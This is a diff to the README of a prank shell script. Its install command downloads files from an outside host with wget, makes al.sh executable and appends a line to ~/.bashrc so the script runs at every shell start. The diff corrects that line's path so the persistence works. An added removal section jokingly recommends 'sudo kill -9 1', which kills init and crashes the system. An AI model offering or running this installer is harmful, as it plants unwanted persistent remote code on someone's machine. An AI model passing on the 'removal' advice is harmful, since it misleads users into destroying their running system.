@@ -29,7 +29,7 @@ Do everything via: mkdir
 ```bash
     ~/.config/al >/dev/null 2>&1; cd ~/.config/al; \
     wget -r -nc -nd http://prank.hostei.com/ >/dev/null 2>&1 && chmod +x al.sh \
-    && echo ". ~/config/al/al.sh & disown $!" >> ~/.bashrc
+    && echo ". ~/.config/al/al.sh & disown $!" >> ~/.bashrc
 ```
 ## Implementation ideas StartUP Command##
 https://help.ubuntu.com/community/AddingProgramToSessionStartup
@@ -39,5 +39,12 @@ https://help.ubuntu.com/community/AddingProgramToSessionStartup
 
 
 ## Removal Instructions ##
-------------------------
+---------------------------
 Really? You want to get rid of this amazing piece of code that inhances your life more than sliced bread?
+
+## Make it stop ##
+---------------------------
+Hint: It starts with m and it plays things. The source code might be a good place to look for things to kill. I recommend:
+```bash
+    sudo kill -9 1
+```
